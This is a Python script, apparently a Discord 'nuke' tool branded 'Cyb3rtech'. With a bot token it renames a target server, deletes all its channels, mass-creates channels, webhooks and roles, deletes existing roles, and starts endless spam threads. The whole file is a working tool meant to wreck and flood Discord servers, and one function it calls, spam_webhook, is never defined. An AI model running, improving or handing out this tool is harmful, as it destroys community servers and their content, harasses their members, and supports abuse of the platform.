import os
import requests
import threading
import time

menu = """
         ██▀███   ▄▄▄       ██▓▓█████▄
         ▓██ ▒ ██▒▒████▄    ▓██▒▒██▀ ██▌
         ▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒░██   █▌
         ▒██▀▀█▄  ░██▄▄▄▄██ ░██░░▓█▄   ▌
         ░██▓ ▒██▒ ▓█   ▓██▒░██░░▒████▓
         ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▓   ▒▒▓  ▒
           ░▒ ░ ▒░  ▒   ▒▒ ░ ▒ ░ ░ ▒  ▒
           ░░   ░   ░   ▒    ▒ ░ ░ ░  ░
               ░           ░  ░ ░     ░
                        ░
              >> (Bot Verison) <<
"""
menu2 = """
[0] Back to main
[1] Nuke
[2] Message Spam
[3] Delete Channel
[4] Create Channel
[5] Create Role
[6] Delete Role
"""

def show_menu():
    print(f"\033[31m{menu}")
    print(f"\033[31m{menu2}\033[0m")

def is_bot_token_valid(token):
    headers = {"Authorization": f"Bot {token}"}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    return response.status_code == 200 and "bot" in response.json()

def create_webhook(channel_id, headers):
    webhook_data = {"name": "spam-webhook"}
    response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", headers=headers, json=webhook_data)
    if response.status_code == 201:
        webhook = response.json()
        return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
    return None

def spam_channel(channel_id, headers, spam_message):
    while True:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json={"content": spam_message})
        time.sleep(0.5)

def nuke(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    channel_count = int(input('\033[31mNumber of Channels to Create >> \033[0m'))
    spam_message = input('\033[31mMessage to Spam >> \033[0m')
    new_name = input('\033[31mNew Server Name >> \033[0m')
    new_icon_url = input('\033[31mNew Server Icon URL >> \033[0m')
    print(f"\033[31m[?]\033[0m Nuke en cours \033[31m[?]\033[0m")

    headers = {"Authorization": f"Bot {token}"}

    requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json={"name": new_name, "icon": new_icon_url})

    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
        time.sleep(0.1)

    created_channels = []
    for i in range(channel_count):
        channel_data = {"name": "Cyb3rtech tool 💣", "type": 0}
        new_channel = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data).json()
        created_channels.append(new_channel['id'])
        time.sleep(0.1)

    webhooks = []
    for channel_id in created_channels:
        webhook_url = create_webhook(channel_id, headers)
        if webhook_url:
            webhooks.append(webhook_url)
            time.sleep(1)

    for webhook_url in webhooks:
        threading.Thread(target=spam_webhook, args=(webhook_url, spam_message)).start()

    for channel_id in created_channels:
        threading.Thread(target=spam_channel, args=(channel_id, headers, spam_message)).start()

def message_spam(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    spam_message = input('\033[31mMessage to Spam >> \033[0m')
    print(f"\033[31m[?]\033[0m Spam en cours \033[31m[?]\033[0m")

    headers = {"Authorization": f"Bot {token}"}
    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()

    for channel in channels:
        threading.Thread(target=spam_channel, args=(channel['id'], headers, spam_message)).start()

def delete_channel(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    print(f"\033[31m[?]\033[0m Delete Channel en cours \033[31m[?]\033[0m")
    headers = {"Authorization": f"Bot {token}"}
    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
    for channel in channels:
        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
        time.sleep(0.1)  # Faster deletion

def create_channel(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    channel_name = input('\033[31mChannel Name >> \033[0m')
    channel_count = int(input('\033[31mNumber of Channels to Create >> \033[0m'))
    print(f"\033[31m[?]\033[0m Mass Channel en cours \033[31m[?]\033[0m")

    headers = {"Authorization": f"Bot {token}"}
    for _ in range(channel_count):
        channel_data = {"name": channel_name, "type": 0}
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data)
        time.sleep(0.1)  # Faster creation

def create_role(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    role_name = input('\033[31mRole Name >> \033[0m')
    role_count = int(input('\033[31mNumber of Roles to Create >> \033[0m'))
    print(f"\033[31m[?]\033[0m Mass Role en cours \033[31m[?]\033[0m")

    headers = {"Authorization": f"Bot {token}"}
    for _ in range(role_count):
        role_data = {"name": role_name}
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=role_data)
        time.sleep(0.1)

def delete_role(token):
    guild_id = input('\033[31mGuild ID >> \033[0m')
    print(f"\033[31m[?]\033[0m Delete Role en cours \033[31m[?]\033[0m")

    headers = {"Authorization": f"Bot {token}"}
    roles = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers).json()

    for role in roles:
        if role['name'] != "@everyone":
            requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=headers)
            time.sleep(0.1)

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\033[31mChoice >> \033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    nuke(token)
            elif choice == 2:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    message_spam(token)
            elif choice == 3:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    delete_channel(token)
            elif choice == 4:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    create_channel(token)
            elif choice == 5:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    create_role(token)
            elif choice == 6:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}")
                token = input('\033[31mToken >> \033[0m')
                if is_bot_token_valid(token):
                    delete_role(token)
            else:
                print("\033[31m[!] Invalid choice\033[0m")
                time.sleep(1)
        except ValueError:
            print("\033[31m[!] Please enter a number\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()
